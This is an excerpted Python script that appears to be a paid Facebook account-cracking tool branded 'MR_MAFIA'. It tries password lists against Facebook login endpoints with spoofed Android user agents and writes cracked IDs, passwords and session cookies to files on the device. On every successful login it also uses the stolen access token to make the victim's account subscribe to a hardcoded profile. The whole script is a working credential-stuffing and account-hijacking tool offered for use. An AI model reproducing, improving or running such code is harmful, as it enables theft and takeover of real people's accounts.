# Owner toufik-tlamcani / Facebook TOUFIK TLAMCANI
...
os.system('clear')
print('             \x1b[38;5;46m WELCOME TO 𝗧𝗢𝗨𝗙𝗜𝗞 WORLD          ')
...
def UA():
    ...
    b = ";[[FBAN/Orca-Android;FBAV/228.0.0.27.119;FBPN/com.facebook.orca;FBLC/ro_RO;FBBV/44335566;FBCR/Orange;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Mi A2;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2160};FB_FW/1;]"
    c = ";[[FBAN/Orca-Android;FBAV/240.0.0.34.130;FBPN/com.facebook.orca;FBLC/nl_NL;FBBV/66557788;FBCR/KPN;FBMF/OnePlus;FBBD/OnePlus;FBDV/ONEPLUS A5000;FBSV/9;FBCA/arm64-v8a;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    d = ";[[FBAN/Orca-Android;FBAV/162.0.0.16.75;FBPN/com.facebook.orca;FBLC/ja_JP;FBBV/22113344;FBCR/SoftBank;FBMF/Sony;FBBD/Sony;FBDV/SO-02K;FBSV/9;FBCA/arm64-v8a;FBDM/{density=3.0,width=1080,height=2160};FB_FW/1;]"
    ua = a+b+c+d
    return ua
...
def UAA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[[FBAN/FB4A;FBAV/207.0.0.37.128;FBBV/135678901;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_GB;FBRV/135678800;FBCR/Vodafone;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A6003;FBSV/10;FBOP/19;FBCA/armeabi-v7a;]"
    ua = a+b
    return ua
#------------------[ COLORS ]-------------------#
...
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝
            M A F I A
34m═════════════════════════════════════════
 {green}[{red}<\>{green}] AUTHOR  : MR_MAFIA
 {green}[{red}<\>{green}] SERVICE : {rrrrrrrr}PAID \033[;0m\033[1;93m
 {green}[{red}<\>{green}] VERSION : 8.9
\033[1;34m═════════════════════════════════════════""")
# I love you Mom 
def linex():
    print('\033[1;34m═════════════════════════════════════════')
...
def menu():
                        ...
                        if xd in ['1','01']:
                                clear()
                                print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE EXAMPLE : /sdcard/mr_mafia.txt')
                                linex()
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100000448388969')
                                menu() 
                        elif xd in ['0','00']:
                                exit(' Thanks for use ♥ ')
                        else:
...
def M_file_1(ids,names,passlist):
                try:
                        ...
                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}MR_MAFIA\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                u1a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 10; SM-A520W Build/SKQ1.210216.001) [FBAN/Orca-Android;FBAV/201.0.0.31.104;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/140112233;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBDV/SM-A520W;FBSV/8.0.0;FBCA/armeabi-v7a;FBDM/{density=3.0,width=720,height=1440};FB_FW/1;]"
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\x1b[1;92m<[MR_MAFIA-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                        ...
                                        open('/sdcard/MR_MAFIA_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MR_MAFIA_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m<[MR_MAFIA-2F]> '+ids+' | '+pas)
                                                open('/sdcard/MR_MAFIA-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break                  
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\x1b[38;5;246m<[MR_MAFIA-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                                open('/sdcard/MR_MAFIA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/MR_MAFIA-CP.txt','a').write(ids+'|'+pas+'\n')
...
def M_file_2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                u2a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a;]]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                if 'session_key' in q:
                                        ...
                                        token = q['access_token']
                                        requests.post('https://graph.facebook.com/'+'833553969/'+'subscribers'+'?access_token='+token)
                                        open('/sdcard/MR_MAFIA_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MR_MAFIA_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
...
def M_file_3(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            #u3a = "[[FBAN/FB4A;FBAV/66.0.0.4891;FBBV/63910255;FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/ar_AE;FBBV/135374479;FBCR/EE;FBMF/samsung;FBBD/samsung;FBDV/SM-A520F;FBSV/8.0.0;FBCA/armeabi-v7a;FBDM/{density=2.0,width=1280,height=1423};FB_FW/1;]]"
...
'Content-Type': 'application/json'}
            ...
            if 'session_key' in po:
                ...
                requests.post('https://graph.facebook.com/'+'833553969/'+'subscribers'+'?access_token='+token)
                open('/sdcard/MR_MAFIA_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MR_MAFIA_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                  if 'y' in pcp:
...
'Content-Type': 'application/json'}
            ...
            if 'session_key' in po:
                ...
                token = po['access_token']
                requests.post('https://graph.facebook.com/'+'833553969/'+'subscribers'+'?access_token='+token)
                open('/sdcard/MR_MAFIA_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MR_MAFIA_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                  if 'y' in pcp:
